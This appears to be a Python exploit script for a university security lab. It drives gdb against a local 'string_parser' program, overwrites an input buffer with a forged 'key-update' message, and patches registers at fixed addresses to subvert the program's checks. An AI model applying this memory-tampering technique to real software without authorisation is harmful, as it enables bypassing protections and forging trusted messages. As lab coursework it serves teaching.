#from cryptodome import *
import os
import subprocess
import signal
from time import sleep
import re

to_kill = []

path = "/home/isl/t1/"
node_prefix = ""
#path = "/mnt/hgfs/VMwareMain/ETH/Lab/Module4/Task1/"
#node_prefix = "/home/toroto006/Downloads/node-v16.13.0-linux-x64/bin/"

def cleanUp():
    os.system("pkill -9 gdb")
    os.system("pkill -9 node")
    os.system("pkill -9 string_parser")

def writeGDB(p, cmd):
    p.stdin.write(cmd.encode())
    p.stdin.flush()

def setup() -> subprocess.Popen:
    #sleep(2)
    #  Ensure that you start M, P and SP before starting RP to guarantee correct operation
    #M = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}manager", "&"])
    #to_kill.append(M.pid)
    #P = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}peripheral", "&"])
    #to_kill.append(P.pid)
    os.system(f"cd {path} && {path}run_manager.sh ")
    os.system(f"cd {path}  && {path}run_peripheral.sh ")
    sleep(2)
    #SP = subprocess.Popen(["gdb", f"{path}string_parser"], stdin=subprocess.PIPE)
    SP = subprocess.Popen(["gdb", "screen"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    sleep(1)
    writeGDB(SP, 'set pagination off\n')
    writeGDB(SP, "set follow-fork-mode child\n")
    writeGDB(SP, "set breakpoint pending on\n")
    sleep(3)
    return SP

def run1():
    SP = setup()
    writeGDB(SP, 'break gcm_crypt_and_tag\n')
    writeGDB(SP, f"run -dmS string_parser {path}string_parser\n")
    # Exploit
    RP = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}remote_party"])
    sleep(1)
    # get the info
    writeGDB(SP, 'c\n')
    info = ""
    while "input=0x7ff" not in info:
        info = SP.stdout.readline().decode().rstrip()
        #print(f'SP2<{info}')
    regex = r"input=(0x[0-9a-f]*) "
    addr = re.findall(regex, info, re.MULTILINE)[0]
    to_write = f'set {{char[40]}}{addr} = "<mes><action type=\\"key-update\\"/></mes>"\n'
    writeGDB(SP, to_write)
    writeGDB(SP, f'x /s {addr}\n')
    writeGDB(SP, 'c\n')
    SP.stdin.close()
    SP.stdout.close()
    sleep(2)

def run2():
    SP = setup()
    # Exploit
    writeGDB(SP, "break stringParser\n")
    writeGDB(SP, f"run -dmS string_parser {path}string_parser\n")
    sleep(2)
    RP = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}remote_party"])
    sleep(2)
    writeGDB(SP, 'b* 0x0403395\n')
    writeGDB(SP, 'b* 0x04033e8\n')
    writeGDB(SP, 'b* 0x04033fb\n')
    writeGDB(SP, 'c\n')
    to_write = 'set $eax = 0x8da8a1\n'
    writeGDB(SP, to_write)
    writeGDB(SP, 'c\n')
    writeGDB(SP, 'set $rdi = 0x4ce296\n')
    writeGDB(SP, 'c\n')
    writeGDB(SP, 'set $al = 0x13\n')
    writeGDB(SP, 'c\n')
    #code.interact(local=locals())
    SP.stdin.close()
    SP.stdout.close()
    sleep(10)

def main():
    try:
        run1()
        cleanUp()
    except:
        pass
    run2()

if __name__ == "__main__":
    cleanUp()
    try:
        main()
    except Exception as e:
        print(e)
        print(f"An error occured in main!")
    finally:
        cleanUp()
    os.system("cd /home/isl/t1 && /home/isl/t1/run.sh")
    print("Exploit done")
    exit()
